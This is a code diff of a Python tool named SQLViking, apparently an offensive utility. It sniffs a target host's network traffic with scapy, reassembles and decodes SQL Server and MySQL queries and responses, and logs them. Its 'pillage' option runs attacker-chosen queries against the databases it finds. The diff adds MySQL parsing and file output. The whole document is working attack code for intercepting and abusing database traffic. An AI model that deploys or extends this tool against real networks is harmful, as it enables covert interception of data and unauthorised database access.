@@ -1,22 +1,18 @@
 from scapy.all import *
 from Queue import Queue
-import sys
-import threading
-import time
-import pytds
+import sys, threading, time, pytds
 
 pkts=Queue()
 queries=Queue()
-with file("/home/atticus/Desktop/log.txt",'w') as f:
-	f.write("")
 
 class Parse(threading.Thread):
-	#need to be able to set MTU from cmdline
+	#TODO: need to be able to set MTU from cmdline
 	def __init__(self,mtu=1500):
 		threading.Thread.__init__(self)
 		self.die = False
 		self.mtu = mtu
 		self.frag = {}
+		self.res = ''
 
 	def run(self):
 		global pkts
@@ -25,7 +21,8 @@ class Parse(threading.Thread):
 				self.parse(pkts.get())
 
 	def parse(self,pkt):
-		if pkt.payload.payload.sport == 1433:
+		#TODO: determining parser by port. need to account for DBs on non-standard ports.
+		if pkt[TCP].sport == 1433:
 			#reassesmble pkts if fragged
 			key='%s:%s'%(pkt[IP].dst,pkt[TCP].dport)
 			if len(str(pkt[IP])) == self.mtu:
@@ -35,12 +32,16 @@ class Parse(threading.Thread):
 					self.frag[key]=str(pkt[TCP])[20:]
 			else:
 				try:
-					self.parseResp(self.frag[key]+str(pkt[TCP])[20:])
+					self.parseRespSQLServ(self.frag[key]+str(pkt[TCP])[20:])
 					del self.frag[key]
 				except KeyError:
-					self.parseResp(str(pkt[TCP])[20:])
-		elif pkt.payload.payload.dport == 1433:
-			self.parseReq(str(pkt[TCP]).encode('hex')[40:])
+					self.parseRespSQLServ(str(pkt[TCP])[20:])
+		elif pkt[TCP].dport == 1433:
+			self.parseReqSQLServ(str(pkt[TCP]).encode('hex')[40:])
+		elif pkt[TCP].sport == 3306:
+			self.parseRespMySQL(str(pkt[TCP]).encode('hex')[40:])
+		elif pkt[TCP].dport == 3306:
+			self.parseReqMySQL(str(pkt[TCP]).encode('hex')[40:])
 
 	def validAscii(self,h):
 		if int(h,16)>31 and int(h,16)<127:
@@ -49,15 +50,27 @@ class Parse(threading.Thread):
 
 	def readable(self,data):
 		a=""
+		#TODO: terrible code, find better way to iterate over 2 chars at a time
 		for i in range(0,len(data)/2):
 			if self.validAscii(data[i*2:i*2+2]):
 				a+=data[i*2:i*2+2].decode("hex")
 		return a
 
-	def parseReq(self,data):
-		self.println("\n--Req--\n%s\n"%self.readable(data))
+	def parseReqMySQL(self,data):
+		self.logres("\n--MySQL Req--")
+		self.logres("\nRaw: %s\n"%data)
+		self.logres("\nASCII: %s\n"%self.readable(data))
 
-	def parseResp(self,data):
+	def parseRespMySQL(self,data):
+		self.logres("\n--MySQL Resp--")
+		self.logres("\nRaw: %s\n"%data)
+		self.logres("\nASCII: %s\n"%self.readable(data))
+
+	def parseReqSQLServ(self,data):
+		self.logres("\n--SQLServ Req--\n%s\n"%self.readable(data))
+
+	def parseRespSQLServ(self,data):
+		#TODO: this is ghetto as shit. need to clean up pytds fork. also need to add ability to parse col names from query responses
 		resp=''
 		tdssock = pytds._TdsSocket(data)
 		try:
@@ -76,12 +89,18 @@ class Parse(threading.Thread):
 
 		if len(resp) == 0:
 			resp = 'error parsing response'
-		self.println("--Resp--\n%s"%resp)
+		self.logres("--SQLServ Resp--\n%s"%resp)
 
-	def println(self,s):
-		with file("/home/atticus/Desktop/log.txt",'a') as f:
-			f.write(s)
-		print(s)
+	def println(self):
+		print(self.res)
+		self.res=''
+
+	def writeln(self,path):
+		with file(path,'w') as f:
+			f.write(self.res)
+
+	def logres(self,s):
+		self.res+=s
 
 class Scout(threading.Thread):
 	def __init__(self):
@@ -94,7 +113,7 @@ class Scout(threading.Thread):
 	def scout(self):
 		while not self.die:
 			try:
-				sniff(prn=self.pushToQueue,filter="tcp and host 192.168.37.135",store=0,timeout=5)
+				sniff(prn=self.pushToQueue,filter="tcp and host 192.168.37.133",store=0,timeout=5)
 			except:
 				self.die = True
 
@@ -115,11 +134,10 @@ class Pillage(threading.Thread):
 				print('[*] Executing query:\t%s'%q.split('||')[0])
 				print('[*] Targetting:\t%s'%q.split('||')[1])
 
-def writeResults():
+def writeResults(t):
 	print('[*] Enter filepath to write to:')
 	path = raw_input("> ")
-	#with open(path,'w') as f:
-	print('[*] Writing results to:\t%s'%path)	 
+	t.writeln(path)	 
 
 def printResults():
 	print('[*] Results so far:')
@@ -132,11 +150,11 @@ def pillage():
 	dst = raw_input("> ")
 	queries.put(query+"||"+dst)
 
-def parseInput(input):
+def parseInput(input,t):
 	if input == 'w':
-		writeResults()
+		writeResults(t)
 	elif input == 'p':
-		printResults()
+		t.println()
 	elif input == 'r':
 		pillage()
 	elif input == 'q':
@@ -145,6 +163,7 @@ def parseInput(input):
 		print('Unknown command entered')	
 
 def main():
+	#TODO: better menu. running counter of reqs/resps capped and DBs discovered.
 	print('==Welcome to SQLViking!==')
 
 	t1 = Scout()
@@ -161,13 +180,14 @@ def main():
 		print('\tr - run a query against a specified DB')
 		print('\tq - quit')
 		try:
-			parseInput(raw_input("> "))
+			parseInput(raw_input("> "),t2)
 		except KeyboardInterrupt:
 			print('\n[!] Shutting down...')
 			t1.die = True
 			t2.die = True
 			t3.die = True
 			break
+		#TODO: cheap hack to make sure everything prints before reprinting menu. need better solution. using Queue()?		
 		time.sleep(1)
 	
 if __name__ == "__main__":
